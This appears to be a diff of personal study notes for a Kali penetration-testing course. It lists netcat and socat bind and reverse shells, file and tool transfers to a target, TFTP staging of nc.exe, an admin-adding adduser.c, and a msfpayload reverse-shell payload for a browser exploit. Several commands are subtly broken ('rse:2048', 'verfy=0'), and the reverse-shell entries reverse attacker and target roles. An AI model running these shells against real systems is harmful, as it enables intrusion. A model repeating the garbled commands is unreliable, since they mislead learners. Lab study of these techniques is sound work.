@@ -1,8 +1,6 @@
 Pentesting with Kali
 
 
-v2 Notes
-
 # Environment Variables
 
 echo $PATH
@@ -10,7 +8,7 @@ echo $USER                                             Current user
 echo $HOME                                             Home directory
 echo $PWD                                              Present working directory
 
-export t=10.0.0.10                                     Set the target IP as a variable
+export t=192.168.1.10                                  Set the target IP as a variable
 nmap $t
 
 env                                                    Environment variables
@@ -30,52 +28,63 @@ $HISTFILESIZE                                          How many command are kept
 <ctrl+r>  <letter>                                     Reverse i search facility
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-standard input (STDIN) - 0                             Data fed into the program
-standard output (STDOUT) - 1                           Output from the program (deafult to terminal)
-standard error (STDERR) -2                             Error messages (defaults to terminal)
-
-ping google.com > tmp                                  Redirect output to a new file
-ping target.com >> tmp                                 Appending output to an existing file
-wc -m < tmp                                            Redirect STDIN from a file
-
-cat tmp | wc -m                                        Piping the output of the first command into the second command
+standard input    (STDIN)    0                         Data fed into the program
+standard output   (STDOUT)   1                         Output from the program (deafult to terminal)
+standard error    (STDERR)   2                         Error messages (defaults to terminal)
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Text Searching & Manipulation
 
 See discover/notes/bash.sh
 ------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-v1 Notes
 
 # Netcat
 
-Kali              192.168.2.10
-Windows           192.168.2.12
+Kali                  192.168.1.5
+Target                192.168.1.10
 
-# Chat
-Windows           nc -nlvp 4444
-Kali              nc -nv 192.168.2.12 4444
+- Interact with a service
+Kali                  nc -nv 192.168.1.10 110
 
-# Bind shell
-Windows           nc -nlvp 4444 -e cmd.exe
-Kali              nc -nv 192.168.2.12 4444
+- Chat
+Target                nc -nlvp 4444
+Kali                  nc -nv 192.168.1.10 4444
 
-# Reverse shell
-Windows           nc -nlvp 4444
-Kali              nc -nv 192.168.2.12 4444 -e /bin/bash
+- Transfer a file
+Kali                  nc -nv 192.168.1.10 < /usr/share/windows-binaries/wget.exe
+Target                nc -nlvp 4444 > incoming.exe     Notice there is no output in the terminal
 
-# Transfer file
-Windows           nc -nlvp 4444 > incoming.exe
-Kali              nc -nv 192.168.2.12 < /usr/share/windows-binnaries/wget.exe
+- Bind shell
+Kali                  nc -nv 192.168.1.10 4444
+Target                nc -nlvp 4444 -e cmd.exe
+
+- Reverse shell
+Target                nc -nlvp 4444
+Kali                  nc -nv 192.168.1.10 4444 -e /bin/bash
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Ncat is part of the nmap package.
+# Socat
 
-# Bind shell
-Windows           ncat -nlvp 4444 -e cmd.exe --allow 192.168.2.10 --ssl
-Linux             ncat -nv 192.168.2.12 4444 --ssl
+- Interact with a service
+Kali                  socat - TCP4:192.168.1.10:110
+
+- Chat
+Target                socat - TCP4:192.168.1.5
+Kali                  socat TCP4-LISTEN:443 STDOUT
+
+- Transfer a file
+Kali                  socat TCP4-LISTEN:443,fork file:names.txt
+Target                socat TCP4:192.168.1.5:443 file:file-received.txt,create
+
+- Reverse shell
+Target                socat -d -d TCP4-LISTEN:443 STDOUT
+Kali                  socat TCP4:192.168.1.10:443 EXEC:/bin/bash
+
+- Encrypted bind shell
+Kali                  openssl req -newkey rse:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
+                      cat bind_shell.key bind_shell.crt > bind_shell.pem
+                      socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verfy=0,fork EXEC:/bin/bash
+Target                socat - OPENSSL:192.168.1.5:443,verfy=0
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # TFTP
@@ -84,7 +93,7 @@ mkdir /tftp                                            Create a new home folder 
 atftpd --daemon --port 69 /tftp                        Start tftp and assign home folder
 netstat -anup | grep atftp                             Verify the service is running
 cp /usr/share/windows-binaries/nc.exe /tftp/
-tftp -i <attacker IP> get nc.exe                       Run from Windows
+tftp -i 192.168.1.5 get nc.exe                       Run from Windows
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Wireshark
@@ -92,7 +101,7 @@ tftp -i <attacker IP> get nc.exe                       Run from Windows
 Capture > Interfaces > choose your interface.
 To filter out unwanted traffic choose Options.
 Create a capture filter to only listen for traffic on the Windows box on TCP port 4444.
-     host 192.168.2.12 and tcp port 4444
+     host 192.168.1.10 and tcp port 4444
      Start
 
 Now generate some traffic with netcat.
@@ -104,8 +113,8 @@ Right click on any packet > Follow TCP Stream. You should be able to see clear t
 # tcpdump
 
 tcpdump -r <capture.pcap>                              Read the file
-tcpdump -n src host 192.168.2.10 -r <capture.pcap>     Specify a source
-tcpdump -n dst host 192.168.2.12 -r <capture.pcap>     Specify a destination
+tcpdump -n src host 192.168.1.5 -r <capture.pcap>      Specify a source
+tcpdump -n dst host 192.168.1.10 -r <capture.pcap>     Specify a destination
 tcpdump -n port 443 -r <capture.pcap>                  Specify a port
 tcpdump -nX -r <capture.pcap>                          Read the file and dump in hex format
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -122,11 +131,10 @@ inurl:
 # DNS
 
 host -t <type> target.com			     	     Enumeration
-     mx = mail server
-     ns = name server
+    mx = mail server
+    ns = name server
 
 host -l target.com <DNS server>				     Zone transfer
-
 
 # debug.exe
 
@@ -138,7 +146,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 # Local Privilege Escalation - Linux
 
-ssh user@<target IP>
+ssh user@192.168.1.10
 id                                                     Show user/group permissions
 cat /etc/shadow                                        Access denied
 /etc/issue                                             OS info
@@ -188,9 +196,9 @@ cat adduser.c
 #include <stdlib.h>
 int main ()
 {
-   int i;
-   i=system ("net localgroup administrators lee /add");
-   return 0;
+    int i;
+    i=system ("net localgroup administrators lee /add");
+    return 0;
 }
 
 i586-mingw32msvc-gcc adduser.c -o adduser.exe          Cross compile code
@@ -235,12 +243,12 @@ Open IE to <kali-ip>/exploit.html
 netstat -an:find “4444”                                Look for a bind shell
 
 - Kali
-nc -v <target-IP> 4444
+nc -v 192.168.1.10 4444
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Replacing Shellcode
 
-msfpayload windows/shell_reverse_tcp LHOST=192.168.2.10 LPORT=443 J
+msfpayload windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=443 J
 314 bytes in size
 342-314=28 bytes left over
 Copy over the new buffer, then add 28 nops.
@@ -248,5 +256,5 @@ Copy over the new buffer, then add 28 nops.
 nc -lvp 443
 
 - Windows
-Open IE to <attacker IP>/exploit.html
+Open IE to 192.168.1.5/exploit.html
 
